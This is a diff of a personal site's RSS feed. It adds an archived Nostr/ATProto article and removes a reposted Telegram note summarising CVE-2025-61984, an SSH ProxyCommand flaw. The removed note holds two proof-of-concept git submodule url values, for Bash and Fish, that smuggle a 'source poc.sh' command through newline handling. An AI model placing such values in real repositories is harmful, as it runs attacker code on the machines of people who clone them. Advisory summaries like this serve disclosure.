@@ -5,6 +5,27 @@
     <link>https://tien-kou.shunf4.workers.dev/</link>
     <description>Tien-kou Ancestors: misc/, SlipBox/, TheDesk/</description>
       <item>
+        <title>Tien-kou - 2025-10-14 01.04.53</title>
+        <link>https://tien-kou.shunf4.workers.dev/SlipBox/2025-10-14%2001.04.53</link>
+        <guid>tien-kou-guarded/SlipBox/2025-10-14 01.04.53</guid>
+        <pubDate>2025-10-14T01:04:53+08:00</pubDate>
+        <description><![CDATA[
+
+
+<div class="sole-content-wrapper">
+  <div class="principal-content">
+<div class="lang-wrapper" lang="zh-CN"><p>Nostr and ATProto (2024) Nostr 和 ATProto (2024) - <a href="https://shreyanjain.net/2024/07/05/nostr-and-atproto.html" target="_blank">https://shreyanjain.net/2024/07/05/nostr-and-atproto.html</a></p>
+<p>双语留档</p>
+<p><a href="/miscMedia/SlipBox_0_shreyan_ - Nostr and ATProto (2025_10_14 01：02：31).html" class="md-attach md-attach-file-link" target="_blank">SlipBox_0_shreyan_ - Nostr and ATProto (2025_10_14 01：02：31).html</a></p>
+
+
+</div>
+
+  </div>
+</div>
+        ]]></description>
+      </item>
+      <item>
         <title>Tien-kou - 2025-10-13 21.44.09</title>
         <link>https://tien-kou.shunf4.workers.dev/misc/tg/2025-10-13/2025-10-13%2021.44.09</link>
         <guid>tien-kou-guarded/misc/tg/2025-10-13/2025-10-13 21.44.09</guid>
@@ -195,55 +216,6 @@
           <p></p>
             <img loading="lazy" class="tg-img tg-photo" src="/misc/tg/media/m-5802148831897431001.png" title="Telegram wepbage media id 5802148831897431001" alt="A picture related to current telegram webpage message. No more alt detail for now." />
         </td></tr></table>
-    </td></tr>
-  </table>
-
-
-</div>
-
-  </div>
-</div>
-        ]]></description>
-      </item>
-      <item>
-        <title>Tien-kou - 2025-10-10 16.43.50</title>
-        <link>https://tien-kou.shunf4.workers.dev/misc/tg/2025-10-10/2025-10-10%2016.43.50</link>
-        <guid>tien-kou-guarded/misc/tg/2025-10-10/2025-10-10 16.43.50</guid>
-        <pubDate>2025-10-10T16:43:50+08:00</pubDate>
-        <description><![CDATA[
-
-
-<div class="sole-content-wrapper">
-  <div class="principal-content">
-<div class="lang-wrapper" lang="zh-CN">
-  <table class="tg-wrapper-layout">
-    <tr class="tg-wrapper-layout tg-wrapper-brief"><td class="tg-wrapper-layout tg-wrapper-brief"><div class="badge" style="display: inline-block; font-weight: bold;">
-[[Telegram]]
-</div>
-
-    </td></tr>
-    <tr class="tg-wrapper-layout tg-wrapper-body"><td class="tg-wrapper-layout tg-wrapper-body"><a target="_blank" href="https://t.me/billchenla" title="Telegram PeerChannel handle: billchenla" data-title="tg:billchenla">咕 Billchen 咕 🐱 抹茶芭菲批发中心</a> (<span class="tg-author">billchenchina | unsafe (*not rust)</span>)
-      <table class="tg-involvement-layout"><tr class="tg-involvement-layout"><td  class="tg-involvement-layout tg-involvement-type">
-      <span class="tg-involvement-type">[Re]</span>
-      </td><td class="tg-involvement-layout tg-involvement-body"><a target="_blank" href="https://t.me/billchenla" title="Telegram PeerChannel handle: billchenla" data-title="tg:billchenla">咕 Billchen 咕 🐱 抹茶芭菲批发中心</a> (<span class="tg-author">billchenchina | unsafe (*not rust)</span>)
-
-    <div class="tg-white-space-preserve white-space-preserve tg-msg">Exploiting SSH via ProxyCommand, again (CVE-2025-61984)
-
-<a href="https://dgl.cx/2025/10/bash-a-newline-ssh-proxycommand-cve-2025-61984">https://dgl.cx/2025/10/bash-a-newline-ssh-proxycommand-cve-2025-61984</a></div>
-      </td></tr></table>
-
-    <div class="tg-white-space-preserve white-space-preserve tg-msg">TLDR 尽管 openssh 过滤了 '`\";&amp;&lt;&gt;|(){}，但是依然可以利用 Bash 的 exec 在语法错误 (Fish 在 array index OOB) 时的错误处理特性
-
-Bash:
-<pre>[submodule "foo"]
-  path = foo
-  url = "$[+]\nsource poc.sh\n@foo.example.com:foo"</pre>
-
-
-Fish:
-<pre>[submodule "foo"]
-  path = foo
-  url = "$x[0]\nsource poc.sh\n@foo.example.com:foo"</pre></div>
     </td></tr>
   </table>
 
